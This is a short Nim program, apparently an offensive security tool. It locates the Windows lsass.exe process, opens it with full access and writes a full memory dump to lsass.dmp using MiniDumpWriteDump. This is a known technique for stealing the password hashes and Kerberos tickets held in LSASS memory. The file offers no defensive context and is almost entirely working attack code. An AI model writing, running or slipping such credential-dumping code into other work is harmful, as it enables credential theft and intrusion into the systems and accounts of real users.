import winim
import osproc


proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0


proc dumplsass():void =
  var filename = "lsass.dmp"
  

  # var processEntry:PROCESSENTRY32
  # processEntry.dwsize = sizeof(PROCESSENTRY32).DWORD

  var snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)
  var outfile = CreateFileA(filename, GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](nil))
  
    # if Process32First(snapshot, processEntry.addr):
    #   while (_wcsicmp(processName, L"lsass.exe") != 0):
    #     Process32Next(snapshot, &processEntry);
    #     processName = processEntry.szExeFile;
    #     lsassPID = processEntry.th32ProcessID;
      
    #   echo "[+] Got lsass.exe PID: " + lsassPID;
  let lsassPID: DWORD = cast[DWORD](GetLsassPid())
  if not bool(lsassPID):
      echo "[X] Unable to find lsass process"
      quit(1)

  echo "[*] lsass PID: ", lsassPID

  var lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, false, lsassPID);
  var isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, 0x00000002, nil, nil, nil);

when isMainModule:
  dumplsass()
